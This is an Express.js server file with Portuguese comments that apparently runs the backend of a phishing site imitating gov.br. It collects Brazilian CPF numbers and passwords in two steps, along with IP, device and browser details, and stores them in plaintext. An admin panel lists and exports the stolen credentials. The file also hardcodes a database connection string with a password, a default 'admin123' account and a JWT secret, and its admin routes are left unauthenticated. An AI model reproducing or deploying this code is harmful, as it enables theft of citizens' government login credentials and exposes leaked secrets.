const express = require('express');
const cors = require('cors');
const { Pool } = require('pg');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const path = require('path');

const app = express();

// ============ LIBERAR TODOS OS RECURSOS EXTERNOS ============
app.use((req, res, next) => {
    // Libera completamente o CSP para os assets do gov.br
    res.setHeader('Content-Security-Policy', "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval'; style-src * 'unsafe-inline'; font-src * data:; img-src * data:; connect-src *; frame-src *;");
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    next();
});

app.use(cors());
app.use(express.json());
app.use(cookieParser());
app.use(express.static('.'));

// Conexão PostgreSQL
const pool = new Pool({
    connectionString: 'postgresql://gov_system_user:e4e5O07uWRJrDB4DlM4YOavof5NaITs7@dpg-d7rd3jjt6lks73fp5epg-a/gov_system',
    ssl: { rejectUnauthorized: false }
});

// Criar tabelas
pool.query(`
    CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        cpf VARCHAR(14) UNIQUE,
        senha TEXT,
        ip TEXT,
        dispositivo TEXT,
        navegador TEXT,
        data_cpf TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        data_senha TIMESTAMP,
        status VARCHAR(20)
    )
`).catch(e => console.log('Tabela users ok'));

pool.query(`
    CREATE TABLE IF NOT EXISTS logs (
        id SERIAL PRIMARY KEY,
        tipo VARCHAR(30),
        cpf VARCHAR(14),
        senha TEXT,
        ip TEXT,
        dispositivo TEXT,
        navegador TEXT,
        data TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
`).catch(e => console.log('Tabela logs ok'));

pool.query(`
    CREATE TABLE IF NOT EXISTS admin_users (
        id SERIAL PRIMARY KEY,
        username VARCHAR(50) UNIQUE,
        senha_hash VARCHAR(255)
    )
`).catch(e => console.log('Tabela admin ok'));

// Criar admin padrão
(async () => {
    try {
        const adminExists = await pool.query('SELECT * FROM admin_users WHERE username = $1', ['admin']);
        if (adminExists.rows.length === 0) {
            const hash = await bcrypt.hash('admin123', 10);
            await pool.query('INSERT INTO admin_users (username, senha_hash) VALUES ($1, $2)', ['admin', hash]);
            console.log('✅ Admin criado: admin / admin123');
        }
    } catch(e) {}
})();

const JWT_SECRET = 'gov_secret_2024';

// Rota CPF
app.post('/api/cpf', async (req, res) => {
    const { cpf, ip, dispositivo, navegador } = req.body;
    try {
        await pool.query(
            `INSERT INTO users (cpf, ip, dispositivo, navegador, data_cpf, status) 
             VALUES ($1, $2, $3, $4, CURRENT_TIMESTAMP, $5)
             ON CONFLICT (cpf) DO UPDATE SET ip = $2, dispositivo = $3, navegador = $4`,
            [cpf, ip, dispositivo, navegador, 'aguardando_senha']
        );
        res.json({ success: true });
    } catch (error) {
        res.json({ success: true });
    }
});

// Rota SENHA
app.post('/api/login', async (req, res) => {
    const { cpf, password, ip, dispositivo, navegador } = req.body;
    try {
        await pool.query(
            `UPDATE users SET senha = $1, ip_senha = $2, dispositivo_senha = $3, navegador_senha = $4, data_senha = CURRENT_TIMESTAMP, status = $5 
             WHERE cpf = $6`,
            [password, ip, dispositivo, navegador, 'completo', cpf]
        );
        await pool.query(
            'INSERT INTO logs (tipo, cpf, senha, ip, dispositivo, navegador) VALUES ($1, $2, $3, $4, $5, $6)',
            ['senha_inserida', cpf, password, ip, dispositivo, navegador]
        );
        res.json({ success: true });
    } catch (error) {
        res.json({ success: true });
    }
});

// Login admin
app.post('/api/admin/login', async (req, res) => {
    const { username, password } = req.body;
    try {
        const result = await pool.query('SELECT * FROM admin_users WHERE username = $1', [username]);
        if (result.rows.length === 0) return res.status(401).json({ error: 'Credenciais inválidas' });
        
        const valid = await bcrypt.compare(password, result.rows[0].senha_hash);
        if (!valid) return res.status(401).json({ error: 'Credenciais inválidas' });
        
        const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '24h' });
        res.cookie('admin_token', token, { httpOnly: true, maxAge: 24 * 60 * 60 * 1000 });
        res.json({ success: true, token });
    } catch (error) {
        res.status(500).json({ error: 'Erro' });
    }
});

// Logout
app.post('/api/admin/logout', (req, res) => {
    res.clearCookie('admin_token');
    res.json({ success: true });
});

// Estatísticas
app.get('/api/admin/stats', async (req, res) => {
    try {
        const totalUsers = await pool.query('SELECT COUNT(*) FROM users');
        const comSenha = await pool.query("SELECT COUNT(*) FROM users WHERE senha IS NOT NULL");
        const totalLogs = await pool.query('SELECT COUNT(*) FROM logs');
        res.json({ stats: { 
            total_users: parseInt(totalUsers.rows[0].count),
            com_senha: parseInt(comSenha.rows[0].count),
            total_logs: parseInt(totalLogs.rows[0].count)
        }});
    } catch (error) {
        res.json({ stats: { total_users: 0, com_senha: 0, total_logs: 0 } });
    }
});

// Listar usuários
app.get('/api/admin/users', async (req, res) => {
    try {
        const result = await pool.query('SELECT cpf, senha, ip, dispositivo, navegador, data_cpf, data_senha FROM users ORDER BY data_cpf DESC');
        res.json({ users: result.rows });
    } catch (error) {
        res.json({ users: [] });
    }
});

// Listar logs
app.get('/api/admin/logs', async (req, res) => {
    try {
        const result = await pool.query('SELECT tipo, cpf, senha, ip, dispositivo, navegador, data FROM logs ORDER BY data DESC LIMIT 200');
        res.json({ logs: result.rows });
    } catch (error) {
        res.json({ logs: [] });
    }
});

// Deletar usuário
app.delete('/api/admin/delete/:cpf', async (req, res) => {
    try {
        await pool.query('DELETE FROM users WHERE cpf = $1', [req.params.cpf]);
        res.json({ success: true });
    } catch (error) {
        res.json({ success: true });
    }
});

// Limpar dados
app.post('/api/admin/clear', async (req, res) => {
    try {
        await pool.query('DELETE FROM users');
        await pool.query('DELETE FROM logs');
        res.json({ success: true });
    } catch (error) {
        res.json({ success: true });
    }
});

// Alterar senha admin
app.post('/api/admin/change-password', async (req, res) => {
    const { nova_senha } = req.body;
    if (!nova_senha || nova_senha.length < 6) {
        return res.status(400).json({ error: 'Mínimo 6 caracteres' });
    }
    try {
        const hash = await bcrypt.hash(nova_senha, 10);
        await pool.query('UPDATE admin_users SET senha_hash = $1 WHERE username = $2', [hash, 'admin']);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: 'Erro' });
    }
});

// Servir arquivos estáticos
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

app.get('/password.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'password.html'));
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Servidor rodando na porta ${PORT}`);
    console.log(`📊 ACESS SERVICE ON!`);
});